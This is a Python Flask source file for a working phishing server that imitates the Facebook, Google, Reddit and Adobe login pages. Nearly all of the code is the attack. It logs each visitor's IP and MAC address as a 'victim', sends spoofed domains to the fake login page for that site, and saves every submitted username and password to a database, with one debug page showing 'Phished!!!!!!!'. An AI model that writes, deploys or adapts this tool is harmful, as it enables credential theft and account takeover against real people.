import subprocess
import sys
import threading
import getmac
from flask import Flask, redirect, render_template, request, url_for, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'Sec rei'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///phishDB.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class Site(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    domain = db.Column(db.String(200), nullable=False)

    def __repr__(self) -> str:
        return f'<Site {self.id} | {self.domain}>'



class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    MAC_address = db.Column(db.String(20))
    IP_address = db.Column(db.String(20))

    def __repr__(self):
        return f'<Victim {self.MAC_address} | {self.IP_address}>'


class VictimCredentials(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username_or_email = db.Column(db.String(120), nullable=False)
    password = db.Column(db.String(200), nullable=False)

    site_id = db.Column(db.Integer, db.ForeignKey('site.id'), nullable=False)
    victim_id = db.Column(db.Integer, db.ForeignKey('victim.id'), nullable=False)

    victim = db.relationship('Victim', foreign_keys=victim_id)
    site = db.relationship('Site', foreign_keys=site_id)

    def __repr__(self):
        return f'<Creds {self.username_or_email} | {self.password}>'


VIEW_VICTIMS = """SELECT site.domain, victim.IP_address, victim.MAC_address, username_or_email, password FROM victim_credentials
INNER JOIN victim ON victim_credentials.victim_id = victim.id
INNER JOIN site ON victim_credentials.site_id = site.id"""


@app.route('/', methods=['POST', 'GET'])
def index():
    if request.method == 'POST':
        print(f'submit: {request.form["submit"]}')

        if request.form["submit"] == "Login1":
            return redirect('/login1')
        elif request.form["submit"] == "FB":
            return redirect('/fb_login')
        elif request.form["submit"] == "Google":
            return redirect('/google_login')
        elif request.form["submit"] == "Reddit":
            return redirect('/reddit_login')
        elif request.form["submit"] == "Adobe":
            return redirect('/adobe_login')
    else:

        print(
            f"Host: {request.headers['Host']} | IP: {request.remote_addr} | MAC: {getmac.get_mac_address(ip=request.remote_addr)}")

        try:
            session['victim_id'] = Victim.query.filter_by(IP_address=request.remote_addr,
                                                          MAC_address=getmac.get_mac_address(
                                                              ip=request.remote_addr)).first_or_404().id
        except Exception as e:
            new_victim = Victim(MAC_address=getmac.get_mac_address(ip=request.remote_addr),
                                IP_address=request.remote_addr)
            try:
                db.session.add(new_victim)
                db.session.commit()

                session['victim_id'] = new_victim.id
            except Exception as e:
                print(e)

        if 'facebook.com' in request.headers['Host']:
            return redirect('/fb_login')
        elif 'google.com' in request.headers['Host']:
            return redirect('/google_login')
        elif 'reddit.com' in request.headers['Host']:
            return redirect('/reddit_login')
        elif 'adobe.com' in request.headers['Host']:
            return redirect('/adobe_login')
        else:
            return render_template('index.html')


@app.route('/login1', methods=['POST', 'GET'])
def login1():
    if request.method == 'POST':
        username = request.form["username"]
        password = request.form["password"]

        return render_template("form1.html", msg=f"Phished!!!!!!! | UN: {username} | PW: {password}")
    else:
        return render_template("form1.html", msg="")


def insert_victim_creds_to_db(username_or_email, password, site_id, victim_id):
    try:
        new_victim_creds = VictimCredentials(username_or_email=username_or_email, password=password, site_id=site_id,
                                             victim_id=victim_id)
        db.session.add(new_victim_creds)
        db.session.commit()
    except Exception as e:
        print(e)


@app.route('/fb_login', methods=['POST', 'GET'])
def fb():
    if request.method == 'POST':
        username = request.form["email"]
        password = request.form["pass"]

        print(f'UN:{username}, PW:{password}')
        insert_victim_creds_to_db(username, password, Site.query.filter_by(domain="facebook.com").first_or_404().id,
                                  session['victim_id'])

        return render_template("fb_login.html")
    else:
        return render_template("fb_login.html")


@app.route('/google_login', methods=['POST', 'GET'])
def google():
    if request.method == 'POST':
        username = request.form["username"]
        password = request.form["password"]

        print(f'UN:{username}, PW:{password}')
        insert_victim_creds_to_db(username, password, Site.query.filter_by(domain="google.com").first_or_404().id,
                                  session['victim_id'])

        return render_template("new_google_login.html")
    else:
        return render_template("new_google_login.html")


@app.route('/reddit_login', methods=['POST', 'GET'])
def reddit():
    if request.method == 'POST':
        username = request.form["username"]
        password = request.form["password"]

        print(f'UN:{username}, PW:{password}')
        insert_victim_creds_to_db(username, password, Site.query.filter_by(domain="reddit.com").first_or_404().id,
                                  session['victim_id'])

        return render_template("reddit_login.html")
    else:
        return render_template("reddit_login.html")


@app.route('/adobe_login', methods=['POST', 'GET'])
def adobe():
    if request.method == 'POST':
        username = request.form["username"]
        password = request.form["password"]

        print(f'UN:{username}, PW:{password}')
        insert_victim_creds_to_db(username, password, Site.query.filter_by(domain="adobe.com").first_or_404().id,
                                  session['victim_id'])

        return render_template("adobe_login.html")
    else:
        return render_template("adobe_login.html")


@app.before_first_request
def db_setup():
    sites = ['facebook.com', 'google.com', 'reddit.com', 'adobe.com']

    for i in sites:
        try:
            site = Site.query.filter_by(domain=i).first_or_404()
            print(site)
        except Exception as e:
            new_site = Site(domain=i)
            db.session.add(new_site)
            db.session.commit()


if __name__ == "__main__":
   ''' hosts = {'ipv4': "0.0.0.0", 'ipv6': "::"}

    if sys.argv[2] == 'https':
        if sys.argv[1] == 'v4':
            app.run(debug=False, port=443, host=hosts['ipv4'], ssl_context='adhoc')
        elif sys.argv[1] == 'v6':
            app.run(debug=False, port=443, host=hosts['ipv6'], ssl_context='adhoc')

    elif sys.argv[2] == 'http':
        if sys.argv[1] == 'v4':
            app.run(debug=False, port=80, host=hosts['ipv4'])
        elif sys.argv[1] == 'v6':
            app.run(debug=False, port=80, host=hosts['ipv6'])
   '''
   with app.app_context():
       db.create_all()
   hosts = {'v4': "0.0.0.0", 'v6': "::"}

   print(f"hosts: {hosts}")  # Debug print statement

   try:
       protocol = sys.argv[2]
       ip_version = sys.argv[1]

       print(f"ip_version: {ip_version}")  # Debug print statement

       if protocol not in ['http', 'https']:
           raise ValueError("Invalid protocol. Choose 'http' or 'https'.")
       if ip_version not in ['v4', 'v6']:
           raise ValueError("Invalid IP version. Choose 'v4' or 'v6'.")

       if protocol == 'https':
           app.run(debug=False, port=443, host=hosts[ip_version], ssl_context='adhoc')
       elif protocol == 'http':
           app.run(debug=False, port=80, host=hosts[ip_version])

   except IndexError:
       print("Please provide IP version ('v4' or 'v6') and protocol ('http' or 'https')")
   except ValueError as e:
       print(e)
   except KeyError as e:
       print(f"KeyError: {e}")  # Extra catch block to provide more info on KeyError